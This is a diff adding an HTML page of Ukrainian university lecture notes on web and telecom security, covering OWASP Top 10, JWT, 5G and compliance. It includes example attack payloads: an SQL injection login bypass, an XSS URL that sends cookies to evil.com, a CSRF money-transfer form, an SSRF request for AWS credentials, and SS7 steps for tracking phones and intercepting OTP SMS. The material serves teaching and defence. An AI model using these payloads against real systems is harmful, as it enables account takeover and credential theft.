@@ -1,0 +1,417 @@
+<!doctype html>
+<html lang="uk">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Конспект Лекції 7 — Безпека веб- та телеком-застосунків</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0d1117;
+            color: #c9d1d9;
+            line-height: 1.7;
+            font-size: 16px;
+        }
+        .wrapper { max-width: 960px; margin: 0 auto; padding: 2rem 1.5rem; }
+        nav {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 8px;
+            padding: 1rem 1.5rem;
+            margin-bottom: 2rem;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.5rem;
+            align-items: center;
+        }
+        nav strong { color: #58a6ff; margin-right: 0.5rem; }
+        nav a { color: #58a6ff; text-decoration: none; font-size: 0.9em; padding: 3px 8px; background: #1f2937; border-radius: 4px; }
+        nav a:hover { background: #1f6feb; }
+        h1 { color: #e6edf3; font-size: 2em; margin-bottom: 0.3em; border-bottom: 2px solid #1f6feb; padding-bottom: 0.4em; }
+        h2 { color: #58a6ff; font-size: 1.4em; margin: 2rem 0 0.6rem; padding-left: 0.5em; border-left: 3px solid #1f6feb; }
+        h3 { color: #e8b04b; font-size: 1.1em; margin: 1.2rem 0 0.4rem; }
+        h4 { color: #a5d6ff; font-size: 1em; margin: 1rem 0 0.3rem; }
+        p { margin-bottom: 0.8em; }
+        ul, ol { padding-left: 1.5em; margin-bottom: 0.8em; }
+        li { margin-bottom: 0.3em; }
+        code {
+            background: #161b22;
+            color: #58a6ff;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 0.88em;
+            font-family: 'Fira Code', 'Courier New', monospace;
+        }
+        pre {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            padding: 1em 1.2em;
+            overflow-x: auto;
+            margin: 0.8em 0;
+        }
+        pre code { background: none; padding: 0; color: #c9d1d9; font-size: 0.85em; line-height: 1.5; }
+        table { border-collapse: collapse; width: 100%; margin: 0.8em 0; font-size: 0.9em; }
+        th { background: #1f6feb; color: #fff; padding: 6px 10px; text-align: left; }
+        td { padding: 5px 10px; border-bottom: 1px solid #30363d; }
+        tr:nth-child(even) td { background: #161b22; }
+        blockquote {
+            border-left: 3px solid #e8b04b;
+            margin: 1em 0;
+            padding: 0.5em 1em;
+            background: #161b22;
+            border-radius: 0 6px 6px 0;
+            color: #e8b04b;
+        }
+        .section-block {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 8px;
+            padding: 1.2em 1.5em;
+            margin: 1.5em 0;
+        }
+        .tag { background: #1f6feb; border-radius: 4px; padding: 1px 6px; font-size: 0.78em; color: #fff; display: inline-block; margin: 1px; }
+        .tag-green { background: #238636; border-radius: 4px; padding: 1px 6px; font-size: 0.78em; color: #fff; display: inline-block; margin: 1px; }
+        .tag-red { background: #da3633; border-radius: 4px; padding: 1px 6px; font-size: 0.78em; color: #fff; display: inline-block; margin: 1px; }
+        hr { border: none; border-top: 1px solid #30363d; margin: 2rem 0; }
+        a { color: #58a6ff; }
+        a:hover { text-decoration: underline; }
+        .toc { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 1em 1.5em; margin-bottom: 2rem; }
+        .toc h3 { color: #58a6ff; margin-top: 0; }
+        .toc ol { margin: 0; }
+        .toc li { margin-bottom: 0.2em; }
+    </style>
+</head>
+<body>
+    <div class="wrapper">
+        <nav>
+            <strong>Лекція 7</strong>
+            <a href="slides.md">📊 Слайди (MD)</a>
+            <a href="notes.md">📝 Конспект (MD)</a>
+            <a href="references.md">📚 Джерела</a>
+            <a href="../lecture-06/notes.html">← Лекція 6</a>
+        </nav>
+
+        <h1>Лекція 7 — Безпека веб- та телеком-застосунків</h1>
+        <p style="color:#888; margin-bottom:1.5em;">Курс: Інформаційна безпека телекомунікаційних та хмарних технологій | Модуль 2</p>
+
+        <div class="toc">
+            <h3>📋 Зміст</h3>
+            <ol>
+                <li><a href="#web-intro">Чому веб-застосунки — ціль №1</a></li>
+                <li><a href="#owasp">OWASP Top 10 — 2021</a></li>
+                <li><a href="#sqli">SQL Injection</a></li>
+                <li><a href="#auth">Вразливості автентифікації та JWT</a></li>
+                <li><a href="#xss">XSS — Cross-Site Scripting</a></li>
+                <li><a href="#csrf-ssrf">CSRF та SSRF</a></li>
+                <li><a href="#idor">IDOR та Broken Access Control</a></li>
+                <li><a href="#ss7">SS7 — вразливості сигналізації</a></li>
+                <li><a href="#5g">5G Security Architecture</a></li>
+                <li><a href="#fraud">Telecom Fraud</a></li>
+                <li><a href="#waf">AWS WAF та DevSecOps</a></li>
+                <li><a href="#compliance">Відповідність</a></li>
+            </ol>
+        </div>
+
+        <hr>
+
+        <section id="web-intro">
+            <h2>1. Чому веб-застосунки є ціллю №1</h2>
+            <p>Веб-застосунки відкриті для Internet 24/7, містять бізнес-логіку та персональні дані мільйонів користувачів. За даними Verizon DBIR 2023, <strong>43% усіх кібератак</strong> спрямовані на веб-застосунки.</p>
+
+            <h3>Ключові чинники ризику</h3>
+            <ul>
+                <li>Публічна доступність з будь-якого куточка світу</li>
+                <li>Зростаюча складність: мікросервіси, SPA, GraphQL API</li>
+                <li>Швидкий цикл розробки (CI/CD) без достатнього security review</li>
+                <li>Залежність від третіх сторін (npm, pip, Maven)</li>
+            </ul>
+
+            <h3>Ключові стандарти</h3>
+            <table>
+                <tr><th>Організація</th><th>Стандарт / Ресурс</th></tr>
+                <tr><td>OWASP</td><td>Top 10, ASVS, SAMM, Cheat Sheets</td></tr>
+                <tr><td>NIST</td><td>SP 800-95 Web Services Security</td></tr>
+                <tr><td>PCI DSS</td><td>Requirement 6: Secure Systems &amp; Applications</td></tr>
+                <tr><td>ISO 27001</td><td>Annex A.14: System Acquisition, Development</td></tr>
+            </table>
+        </section>
+
+        <hr>
+
+        <section id="owasp">
+            <h2>2. OWASP Top 10 — 2021</h2>
+            <table>
+                <tr><th>#</th><th>Категорія</th><th>Суть</th></tr>
+                <tr><td>A01</td><td><strong>Broken Access Control</strong></td><td>IDOR, обхід авторизації, CORS-помилки</td></tr>
+                <tr><td>A02</td><td><strong>Cryptographic Failures</strong></td><td>HTTP, MD5 для паролів, слабкі алгоритми</td></tr>
+                <tr><td>A03</td><td><strong>Injection</strong></td><td>SQL, Command, LDAP, NoSQL ін'єкції</td></tr>
+                <tr><td>A04</td><td><strong>Insecure Design</strong></td><td>Відсутність threat modeling, security requirements</td></tr>
+                <tr><td>A05</td><td><strong>Security Misconfiguration</strong></td><td>Дефолтні паролі, відкриті S3, XXE</td></tr>
+                <tr><td>A06</td><td><strong>Vulnerable Components</strong></td><td>Log4Shell, застарілі бібліотеки</td></tr>
+                <tr><td>A07</td><td><strong>Auth Failures</strong></td><td>Слабкі паролі, відсутність MFA</td></tr>
+                <tr><td>A08</td><td><strong>Software &amp; Data Integrity</strong></td><td>Supply chain, CI/CD компрометація</td></tr>
+                <tr><td>A09</td><td><strong>Logging &amp; Monitoring Failures</strong></td><td>Відсутність аудиту, невчасне реагування</td></tr>
+                <tr><td>A10</td><td><strong>SSRF</strong></td><td>Доступ до внутрішніх ресурсів через сервер</td></tr>
+            </table>
+        </section>
+
+        <hr>
+
+        <section id="sqli">
+            <h2>3. SQL Injection — детальний розбір</h2>
+
+            <h3>Механізм атаки</h3>
+            <pre><code>-- Вразливий PHP-код:
+$query = "SELECT * FROM users WHERE username='" . $_POST['user'] . "'";
+
+-- Введення зловмисника: admin' --
+-- Результуючий запит:
+SELECT * FROM users WHERE username='admin' --'
+-- Коментар '--' ігнорує умову пароля → вхід без пароля!</code></pre>
+
+            <h3>Типи SQL Injection</h3>
+            <table>
+                <tr><th>Тип</th><th>Характеристика</th></tr>
+                <tr><td>In-band</td><td>Результат відразу видно у відповіді</td></tr>
+                <tr><td>Blind Boolean</td><td>Умовні відповіді (true/false)</td></tr>
+                <tr><td>Blind Time-based</td><td>Затримка відповіді (<code>SLEEP(5)</code>)</td></tr>
+                <tr><td>Out-of-band</td><td>Дані надсилаються до зовнішнього DNS-сервера</td></tr>
+            </table>
+
+            <h3>Захист</h3>
+            <ol>
+                <li><strong>Parameterized queries</strong> — єдиний надійний метод</li>
+                <li><strong>ORM</strong> — але уважно з raw queries та string interpolation</li>
+                <li><strong>Input validation</strong> — whitelist дозволених символів</li>
+                <li><strong>Least privilege</strong> — обліковий запис БД без DROP, CREATE</li>
+                <li><strong>WAF</strong> — додатковий рівень захисту</li>
+            </ol>
+        </section>
+
+        <hr>
+
+        <section id="auth">
+            <h2>4. Вразливості автентифікації та JWT</h2>
+
+            <h3>JWT атаки</h3>
+            <div class="section-block">
+                <h4><code>alg: none</code> атака</h4>
+                <p>Якщо сервер приймає алгоритм <code>none</code> — підпис не перевіряється, зловмисник може підробити будь-який токен.</p>
+
+                <h4>Algorithm Confusion (RS256 → HS256)</h4>
+                <p>Зловмисник змінює алгоритм у заголовку JWT та використовує публічний ключ RS256 як HMAC-секрет для підпису HS256. Сервер без строгої перевірки алгоритму приймає підроблений токен.</p>
+            </div>
+
+            <h3>Кращі практики</h3>
+            <ul>
+                <li>Строго фіксувати алгоритм (<code>alg</code> whitelist на сервері)</li>
+                <li>HMAC секрет ≥ 256 біт, криптографічно згенерований</li>
+                <li>Короткий TTL (<code>exp</code>), Refresh token з ротацією</li>
+                <li>Зберігати у <code>httpOnly; Secure; SameSite=Strict</code> cookie</li>
+                <li>OAuth 2.0 + PKCE для публічних клієнтів (SPA, Mobile)</li>
+            </ul>
+        </section>
+
+        <hr>
+
+        <section id="xss">
+            <h2>5. XSS — Cross-Site Scripting</h2>
+
+            <h3>Reflected XSS</h3>
+            <pre><code>-- URL зловмисника:
+https://shop.example/search?q=&lt;script&gt;document.location='https://evil.com/steal?c='+document.cookie&lt;/script&gt;
+
+-- Сервер відображає без екранування:
+&lt;p&gt;Результати: &lt;script&gt;document.location=...&lt;/script&gt;&lt;/p&gt;</code></pre>
+
+            <h3>Content Security Policy</h3>
+            <pre><code>Content-Security-Policy: default-src 'self';
+  script-src 'self' https://trusted-cdn.example;
+  style-src 'self' 'nonce-{random}';
+  img-src 'self' data:;
+  frame-ancestors 'none';</code></pre>
+
+            <h3>Захист</h3>
+            <table>
+                <tr><th>Рівень</th><th>Механізм</th></tr>
+                <tr><td>Вихідне кодування</td><td><code>htmlspecialchars()</code>, <code>encodeURIComponent()</code></td></tr>
+                <tr><td>CSP</td><td><code>Content-Security-Policy: default-src 'self'</code></td></tr>
+                <tr><td>Cookie атрибути</td><td><code>HttpOnly; Secure; SameSite=Strict</code></td></tr>
+                <tr><td>Бібліотеки</td><td>DOMPurify, OWASP Java Encoder</td></tr>
+            </table>
+        </section>
+
+        <hr>
+
+        <section id="csrf-ssrf">
+            <h2>6. CSRF та SSRF</h2>
+
+            <h3>CSRF — механізм атаки</h3>
+            <pre><code>&lt;!-- На сайті зловмисника evil.com --&gt;
+&lt;form action="https://bank.example/transfer" method="POST" id="f"&gt;
+  &lt;input type="hidden" name="to" value="attacker"&gt;
+  &lt;input type="hidden" name="amount" value="5000"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('f').submit();&lt;/script&gt;</code></pre>
+
+            <h3>SSRF — атака на AWS IMDS</h3>
+            <pre><code>POST /api/fetch HTTP/1.1
+{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2Role"}
+
+Відповідь:
+{
+  "AccessKeyId": "ASIA...",
+  "SecretAccessKey": "...",
+  "Token": "..."
+}</code></pre>
+
+            <blockquote>
+                <strong>IMDSv2</strong> вирішує цю проблему: для отримання metadata спочатку потрібно PUT-запит за токеном, який не можна підробити через SSRF.
+            </blockquote>
+        </section>
+
+        <hr>
+
+        <section id="idor">
+            <h2>7. IDOR та Broken Access Control</h2>
+
+            <pre><code>GET /api/orders/10001 → 200 OK  (моє замовлення)
+GET /api/orders/10002 → 200 OK  (замовлення ІНШОГО клієнта!) ← IDOR
+
+Виправлення:
+if order.user_id != current_user.id:
+    return 403 Forbidden</code></pre>
+
+            <h3>Горизонтальне vs Вертикальне підвищення привілеїв</h3>
+            <ul>
+                <li><strong>Горизонтальне:</strong> Користувач A отримує доступ до даних Користувача B (однакова роль)</li>
+                <li><strong>Вертикальне:</strong> Звичайний користувач виконує адміністративні функції</li>
+            </ul>
+        </section>
+
+        <hr>
+
+        <section id="ss7">
+            <h2>8. SS7 — Вразливості протоколу сигналізації</h2>
+
+            <blockquote>SS7 розроблявся у 1975 році для закритих телефонних мереж, де всі учасники вважалися довіреними. Сьогодні доступ до SS7 мають тисячі операторів по всьому світу.</blockquote>
+
+            <h3>Відстеження місцезнаходження</h3>
+            <pre><code>1. SRI-SM (SendRoutingInfoForSM) → отримує IMSI + MSC address
+2. PSI (ProvideSubscriberInfo)  → Cell ID абонента
+3. Cell ID → GPS координати через відкриті бази даних
+Точність: 50–300 метрів у містах</code></pre>
+
+            <h3>Перехоплення SMS для bypass 2FA</h3>
+            <pre><code>1. SRI-SM → IMSI жертви
+2. RegisterSS → переадресація SMS на номер зловмисника
+3. "Забув пароль" на bank.example
+4. OTP SMS → до зловмисника → злом акаунту</code></pre>
+
+            <h3>Захист</h3>
+            <ul>
+                <li><strong>SS7 Firewall</strong> — фільтрація аномальних MAP-повідомлень</li>
+                <li><strong>GSMA FS.11</strong> — базові правила фільтрації</li>
+                <li><strong>Моніторинг</strong> — аномальні SRI, ATI, RegisterSS запити</li>
+                <li>Перехід на Diameter (4G) та HTTP/2 SBI (5G)</li>
+            </ul>
+        </section>
+
+        <hr>
+
+        <section id="5g">
+            <h2>9. 5G Security Architecture</h2>
+
+            <h3>SUCI — Subscription Concealed Identifier</h3>
+            <p>У 4G IMSI передавався відкрито (IMSI catcher — Stingray). У 5G SUPI шифрується публічним ключем оператора (ECIES):</p>
+            <pre><code>SUPI (реальний): 255-01-1234567890
+SUCI (зашифрований): [публічний ключ оператора ECIES]
+→ Навіть базова станція не знає реального SUPI!</code></pre>
+
+            <h3>Service-Based Architecture (SBA)</h3>
+            <pre><code>AMF ←──── HTTP/2 + OAuth 2.0 ────→ SMF
+NRF ←──── HTTP/2 + mTLS ──────→  PCF</code></pre>
+
+            <h3>5G Загрози</h3>
+            <table>
+                <tr><th>Загроза</th><th>Опис</th></tr>
+                <tr><td>SUCI Bypass</td><td>Rogue Base Station → розкриття SUPI</td></tr>
+                <tr><td>Rogue AMF</td><td>Підробна Access &amp; Mobility Management Function</td></tr>
+                <tr><td>Slice Isolation Failure</td><td>Витік між мережевими слайсами</td></tr>
+                <tr><td>SBI API attacks</td><td>JWT forgery, OAuth misconfiguration між NF</td></tr>
+            </table>
+        </section>
+
+        <hr>
+
+        <section id="fraud">
+            <h2>10. Telecom Fraud</h2>
+
+            <h3>IRSF (International Revenue Share Fraud)</h3>
+            <p>Найдорожчий вид шахрайства: <strong>~$6 млрд/рік</strong>. Шахрай орендує premium-номер → генерує масові дзвінки → отримує 60-80% від вартості дзвінка.</p>
+
+            <h3>STIR/SHAKEN — захист CallerID</h3>
+            <pre><code>Оригінатор → підписує JWT з номером та attestation → верифікується отримувачем
+Attestation A: повна верифікація абонента
+Attestation B: відомий шлюз, абонент невідомий
+Attestation C: лише маршрут верифіковано</code></pre>
+
+            <h3>FMS — Fraud Management System</h3>
+            <ul>
+                <li>Реального часу аналіз CDR (Call Detail Records)</li>
+                <li>ML-моделі для виявлення аномальних патернів дзвінків</li>
+                <li>GSMA T-ISAC — обмін даними про загрози між операторами</li>
+            </ul>
+        </section>
+
+        <hr>
+
+        <section id="waf">
+            <h2>11. AWS WAF та DevSecOps</h2>
+
+            <h3>Web ACL структура</h3>
+            <pre><code>Web ACL
+├── AWS-AWSManagedRulesCommonRuleSet (Priority: 10)
+├── AWS-AWSManagedRulesSQLiRuleSet (Priority: 20)
+├── Rate-Based Rule: 2000 req/5min per IP (Priority: 30)
+├── IP Set Blocklist (Priority: 40)
+└── Default Action: Allow</code></pre>
+
+            <h3>DevSecOps — Shift Left</h3>
+            <table>
+                <tr><th>Категорія</th><th>Інструмент</th><th>Призначення</th></tr>
+                <tr><td>SAST</td><td>Semgrep, Checkmarx</td><td>Статичний аналіз коду</td></tr>
+                <tr><td>SCA</td><td>Trivy, Snyk</td><td>Вразливості в залежностях</td></tr>
+                <tr><td>DAST</td><td>OWASP ZAP</td><td>Динамічний аналіз</td></tr>
+                <tr><td>IaC Security</td><td>Checkov, tfsec</td><td>Terraform/CloudFormation</td></tr>
+                <tr><td>Secrets</td><td>GitLeaks, truffleHog</td><td>Виявлення секретів у коді</td></tr>
+            </table>
+        </section>
+
+        <hr>
+
+        <section id="compliance">
+            <h2>12. Відповідність — ключові вимоги</h2>
+
+            <table>
+                <tr><th>Стандарт</th><th>Область</th><th>Ключові вимоги</th></tr>
+                <tr><td><strong>GDPR</strong></td><td>Персональні дані EU</td><td>Privacy by Design, повідомлення за 72 год</td></tr>
+                <tr><td><strong>PCI DSS v4.0</strong></td><td>Платіжні картки</td><td>Req. 6 (Secure Apps), WAF або еквівалент</td></tr>
+                <tr><td><strong>ISO 27001:2022</strong></td><td>ISMS</td><td>A.14 (System Dev), A.8 (Asset Mgmt)</td></tr>
+                <tr><td><strong>ETSI TS 102 165</strong></td><td>Телеком</td><td>TVRA методологія оцінки ризиків</td></tr>
+                <tr><td><strong>3GPP TS 33.501</strong></td><td>5G</td><td>5G-AKA, SUCI, NDS/IP, OAuth між NF</td></tr>
+                <tr><td><strong>NIS2 Directive</strong></td><td>Критична інфраструктура</td><td>Обов'язкові заходи кібербезпеки в EU</td></tr>
+            </table>
+        </section>
+
+        <hr>
+
+        <p style="text-align:center; color:#666; font-size:0.85em; margin-top:2rem;">
+            Лекція 7 | Безпека веб- та телеком-застосунків | 38 слайдів<br>
+            Курс: Інформаційна безпека телекомунікаційних та хмарних технологій
+        </p>
+    </div>
+</body>
+</html>
